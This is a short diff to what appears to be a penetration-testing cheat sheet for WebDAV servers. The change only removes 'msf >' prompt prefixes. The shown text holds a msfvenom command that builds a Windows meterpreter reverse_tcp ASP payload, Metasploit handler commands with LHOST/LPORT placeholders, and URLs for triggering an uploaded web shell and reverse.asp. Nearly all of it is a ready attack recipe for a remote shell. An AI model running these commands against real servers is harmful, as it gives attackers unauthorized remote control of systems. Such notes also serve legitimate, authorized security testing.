@@ -41,11 +41,11 @@ http://<ip>/webdav/webshell.asp
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f asp > reverse.asp
 
-msf > use /multi/handler
-msf > set payload windows/meterpreter/reverse_tcp
-msf > set LHOST <ip>
-msf > set LPORT <port>
-msf > exploit
+use /multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <ip>
+set LPORT <port>
+exploit
 
 http://<ip>/webdav/reverse.asp
 ```
